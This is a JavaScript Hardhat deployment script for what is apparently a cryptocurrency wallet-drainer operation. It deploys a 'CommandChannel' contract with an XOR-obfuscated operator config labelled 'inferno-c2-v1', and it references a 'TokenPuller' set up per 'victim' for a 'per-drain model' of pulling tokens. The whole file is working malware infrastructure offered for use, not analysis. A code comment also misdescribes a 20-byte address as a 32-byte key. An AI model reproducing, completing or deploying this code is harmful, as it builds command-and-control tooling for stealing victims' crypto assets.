/**
 * deploy.js
 * Deploys CommandChannel (with an XOR-encrypted operator config) and,
 * optionally, a reusable TokenPuller. Prints the addresses to paste into .env.
 *
 * Usage:
 *   1. Start a chain:  npx hardhat node
 *   2. npm run deploy
 */
require("dotenv").config();
const hre = require("hardhat");
const { ethers } = hre;

// Simple repeating-key XOR, matching CommandChannel.decryptConfig().
function xorEncrypt(plaintext, key) {
  const kb = Buffer.from(key.replace(/^0x/, ""), "hex");
  const pb = Buffer.from(plaintext);
  const out = Buffer.alloc(pb.length);
  for (let i = 0; i < pb.length; i++) out[i] = pb[i] ^ kb[i % kb.length];
  return "0x" + out.toString("hex");
}

async function main() {
  const [admin] = await ethers.getSigners();
  console.log("Deploying as admin:", admin.address);

  // --- Build the plaintext config the front-end will decrypt ---
  const configPlain = JSON.stringify({
    admin: admin.address,
    chainId: (await ethers.provider.getNetwork()).chainId,
    note: "inferno-c2-v1",
  });
  const key = ethers.Wallet.createRandom().address; // 32-byte key from a random wallet
  const encrypted = xorEncrypt(configPlain, key);

  // --- Deploy CommandChannel ---
  const Channel = await ethers.getContractFactory("CommandChannel");
  const channel = await Channel.deploy(encrypted, key);
  await channel.waitForDeployment();
  const channelAddr = await channel.getAddress();
  console.log("CommandChannel:", channelAddr);
  console.log("Channel key:   ", key);
  console.log("Encrypted cfg: ", encrypted);
  console.log("Plaintext cfg: ", configPlain);

  // --- Optional: deploy a reusable TokenPuller (victim/token set at deploy) ---
  // For the per-drain model the backend deploys a fresh puller each time,
  // so this is only needed if you want a fixed address in .env.
  const PULLER = process.env.PULLER;
  if (PULLER && PULLER !== "0x0000000000000000000000000000000000000000") {
    console.log("Using pre-set PULLER from .env:", PULLER);
  }

  console.log("\nPaste into .env:");
  console.log(`COMMAND_CHANNEL=${channelAddr}`);
  console.log(`CONFIG_PLAINTEXT=${configPlain}`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
